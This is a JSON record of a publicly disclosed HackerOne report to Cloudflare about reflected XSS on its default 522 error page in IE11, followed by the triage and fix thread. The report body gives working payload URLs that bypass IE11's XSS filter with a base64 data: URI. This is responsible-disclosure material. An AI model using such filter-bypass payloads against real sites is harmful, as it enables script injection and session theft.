{"id":214620,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ2MjA=","url":"https://hackerone.com/reports/214620","title":"Cloudflare based XSS for IE11","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-03-19T08:43:42.150Z","submitted_at":"2017-03-19T08:43:42.150Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"reactors08","url":"/reactors08","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/051/0b6de7bc77e36e6a2e7db2650a8c18c1108fe28e_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":41,"url":"https://hackerone.com/cloudflare","handle":"cloudflare","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Cloudflare Vulnerability Disclosure","twitter_handle":"cloudflare","website":"https://www.cloudflare.com/disclosure","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-05-04T18:48:58.437Z","bug_reporter_agreed_on_going_public_at":"2017-04-04T18:48:51.050Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"XSS can be performed via malformed URI request in IE11(and potentially in Edge).\nCloudflare has a vulnerable default error page for HTTP 522.\nFor example (it takes some time):\nhttps://hacker.one/%ff\nLets use IE11 to proof the concept.\n`https://hacker.one/%ff/?\"escaped`\nResult:\n\u003e `\u003ca ... href=\"/%ff/?\" escaped\"=\"\"\u003ehttps://hacker.one/%ff/?\"escaped\u003c/a\u003e`\n\nNow lets bypass IE11 anti-XSS filter:\n\u003e `https://hacker.one/%ff/'/src='data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='?\"\u003e\u003c/script\u003e\u003cscript/xxxx='`\n\nor\n\u003e `https://bugcrowd.com/%ff/'/src='data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='?\"\u003e\u003c/script\u003e\u003cscript/xxxx='`\n\nResult:\n\n\u003e `This page (\u003ca href=\"/%ff/'/src='data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='?\"\u003e\u003c/script\u003e\u003cscript/xxxx='\" style=\"margin: 0;padding: 0;text-decoration: underline;font: 12px Helvetica,Arial,sans-serif;color: #007ed9;font-weight: normal;text-align: left;\"\u003ehttps://hacker.one/%ff/'/src='data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='?\"\u003e\u003c/script\u003e\u003cscript/xxxx='\u003c/a\u003e) is currently offline.`","original_report_id":null,"original_report_url":null,"attachments":[{"id":169905,"file_name":"cloudflare_hackerone_xss_offline_page.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/169/905/8c76b97ac53721aba681a79c82f8d4a67672f04c/cloudflare_hackerone_xss_offline_page.jpg?response-content-disposition=attachment%3B%20filename%3D%22cloudflare_hackerone_xss_offline_page.jpg%22%3B%20filename%2A%3DUTF-8%27%27cloudflare_hackerone_xss_offline_page.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4W3YS5FD%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140458Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIGFHTfvNreCpBEx6ma8SNDd1vDDIfs0%2Bg65AmwngiTYQAiAlnCpBqU%2FBhidkHb7BIm1B5mCQRUOVIXp%2BQseSrlRN5iqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMMkyyP6srRKwJnYw5KtcDHeBEJsk4F2SMjLLnKF6VZQ8gTH0LrxcCVqXSMNgZR1F18PpwhYbU8Qwfn4rOecOjc%2FGfNk3djcauIei8aKCcLnzshwHWQSvd29UhjSLaczWwVEte3ncX5%2F7TLBeg7zRQpsc0zFB20Cm8vF8Z5NfsChYhN7bulkH%2FDfJw16%2BYS1fZkQzhsF%2FUaEP8JAGkMj5v5WOr%2FLnx6%2FMMhK6%2BsDFWaIeUhAxulEbhuEZZ6dgcu1gqMyUwcg6D9rjwyKS9mTsUA%2BHVlKPil1lPtr7SxO3tf2vD8Cw7bLkyy75qgFHEvuDCUCELKpXfBVH6PD30xPvCzrVd0fptlqCTt6Cpd5I3iyyU9RW0SJyHzyBPACEpWDB8exeuJzM7TEeRFCbnl0%2FkfEHmTDCBuuqKxE7cVRG87tuNtO3iVLpOhHCzOtUoK2Il4kvMh2HPZMpvYIGHtynKBM%2BIh69sGJa0yvDoN%2FRI6PAGM02ZolRkS4bZfQfYm7fOPbpLxrQWbSljfYgc7qbAOT56FKw4Ty4wTdxJVV1NLklUpTvIFuc4wqfUdZCvpJj%2BZaH0CSm%2FQv7WX13ukuacZxFgzkAlzUArGS2%2FgJQFovV4hCQKUkAlBpn1fxDFCB%2FBfj2XYH0lMJ7wkIsGOqYBZLVkkm4v7ciHR6x1EZfGmDDAlA8GWCaRs%2B7p4f0zSrCh5MwJxKYAhCMitoCHTMbKlCWaIdMl5rpmPNjCa3GtIbMpvdZUwpN0EhEKHvK6WgKkHhzE8vZn5llsPReTP2V7t22qBXykSYg%2BgK2etoazMxx4eBGAB7YXcUmHU%2FW%2FCsmGlbwbgrQPl3suOkp4ARb2LIsd96p9ZA9i%2BG4DSDrVOakuIKwh2Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=42b0fa58da20be8372ba4018194a7551e5e2bc8ab1b238f62765c9d8af537148","file_size":169502,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2017-05-04T18:48:51.089Z","allow_singular_disclosure_after":-140037367.8975046,"singular_disclosure_allowed":true,"vote_count":26,"voters":["jin","sp1d3rs","iamnoooob","bobrov","zlz","fillawful","spam404","jon_bottarini","cuso4","bigbear_","and 16 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1551068,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey thanks for the report.\n\nI will verify this report and get back to you in the next day.\n\nEvan","automated_response":false,"created_at":"2017-03-19T19:30:37.819Z","updated_at":"2017-03-19T19:30:37.819Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1553544,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just to update you. I'm working on getting a Windows machine to test this on.\n\nI'm guessing the XSS takes place in the \"toolbar\" type thing at the top of the screen, that shows the URL?\n\nEvan","automated_response":false,"created_at":"2017-03-20T22:42:17.778Z","updated_at":"2017-03-20T22:42:17.778Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1553637,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I got ahold of a windows computer (unfortunately) and verified this works.\n\nI'll look in to how to fix this. Thanks.","automated_response":false,"created_at":"2017-03-20T23:43:09.909Z","updated_at":"2017-03-20T23:43:09.909Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1562182,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry about such a long delay updating you,\n\nI opened up a PR internally to fix this problem. It's a neat issue in our code that led to it, and an excellent find. Thanks.\n\nEvan","automated_response":false,"created_at":"2017-03-24T20:03:42.026Z","updated_at":"2017-03-24T20:03:42.026Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1570976,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My change got merged and is awaiting release. It should be out tomorrow.\n\nThe release schedule is a little more challenging for changes at the edge, as they are very sensitive.\n\nEvan","automated_response":false,"created_at":"2017-03-29T17:01:26.292Z","updated_at":"2017-03-29T17:01:26.292Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1581934,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This should have been fixed as of last week. Can you confirm it's fixed? It looks fixed to me (I no longer get an alert box).\n\nEvan","automated_response":false,"created_at":"2017-04-03T23:40:16.064Z","updated_at":"2017-04-03T23:40:16.064Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"reactors08","url":"/reactors08"},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1582292,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The bug has been fixed.","automated_response":false,"created_at":"2017-04-04T06:52:41.580Z","updated_at":"2017-04-04T06:52:41.580Z","actor":{"username":"reactors08","cleared":false,"url":"/reactors08","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/051/0b6de7bc77e36e6a2e7db2650a8c18c1108fe28e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1583570,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Lets disclose","automated_response":false,"created_at":"2017-04-04T18:48:51.063Z","updated_at":"2017-04-04T18:48:51.063Z","first_to_agree":true,"actor":{"username":"reactors08","cleared":false,"url":"/reactors08","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/051/0b6de7bc77e36e6a2e7db2650a8c18c1108fe28e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1602853,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"@reactors08 do you have an email address that I can ask you your address for, so we can send you some swag in appreciation?\n\nEvan","automated_response":false,"created_at":"2017-04-10T17:09:14.961Z","updated_at":"2017-04-10T17:09:14.961Z","actor":{"url":"/cloudflare","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Cloudflare Vulnerability Disclosure"}},"reporter":{"username":"reactors08","url":"/reactors08"},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1654545,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-05-04T18:48:58.448Z","updated_at":"2017-05-04T18:48:58.448Z","actor":{"url":"/cloudflare","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Cloudflare Vulnerability Disclosure"}},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}